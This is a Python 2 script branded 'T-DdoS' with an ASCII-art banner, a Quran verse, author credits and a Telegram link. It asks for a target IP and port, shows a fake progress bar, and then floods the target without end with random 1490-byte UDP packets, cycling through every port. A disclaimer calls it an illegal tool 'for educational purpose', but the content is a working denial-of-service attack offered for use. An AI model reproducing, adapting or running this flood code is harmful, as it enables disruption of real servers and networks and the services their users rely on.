*@@@@*  *@@@@**      @@      *@@@@m     m@@@* @@@***@@@      @@      
  @@      @@        m@@m       @@@@    @@@@   @*   @@@      m@@m     
  @@      @@       m@*@@!      @ @@   m@ @@   *   @@@      m@*@@!    
  @@@@@@@@@@      m@  *@@      @  @!  @* @@      @@@      m@  *@@    
  !@      @!      @@@!@!@@     !  @!m@*  @@     @@@   m   @@@!@!@@   
  !@      @!     !*      @@    !  *!@*   @@    !@@   m@  !*      @@  
  :!      !!      !!!!@!!@     !  !!!!*  !!    !!@   !@   !!!!@!!@   
  :!      :!     !*      !!    :  *!!*   !!   !!!   !!@  !*      !!  
::: :   : :!:: : : :   : ::: : ::: :   : ::: : : : : :!: : :   : ::: 
                                                                         
– 𝙰𝚗𝚍 𝚝𝚘 𝙰𝚕𝚕𝚊𝚑 𝚋𝚎𝚕𝚘𝚗𝚐𝚜 𝚝𝚑𝚎 𝚔𝚒𝚗𝚐𝚍𝚘𝚖 𝚘𝚏 𝚝𝚑𝚎 𝚑𝚎𝚊𝚟𝚎𝚗𝚜 𝚊𝚗𝚍 𝚝𝚑𝚎 𝚎𝚊𝚛𝚝𝚑. 𝙰𝚗𝚍 𝙰𝚕𝚕𝚊𝚑 𝚑𝚊𝚜 𝚙𝚘𝚠𝚎𝚛 𝚘𝚟𝚎𝚛 𝚊𝚕𝚕 𝚝𝚑𝚒𝚗𝚐𝚜 –
                                ✷ 𝙰𝚕-𝚀𝚞𝚛𝚊𝚗: 3:189 ✷

print ("\033[91m")
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet T-DdoS")
print
print "Coded By : Mr.Hamza"
print "Author   : Stifen01"
print "Telegram : t.me/https://t.me/+8i8l-hyZwpIzMTg9"
print "Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk,We'll Be Not Responsible For Kind Of Problems"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")
os.system("clear")
print("\033[93m")
os.system("figlet DdoS Attack")
print("Team : BYTEPHANTOM")
print ("\033[92m")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
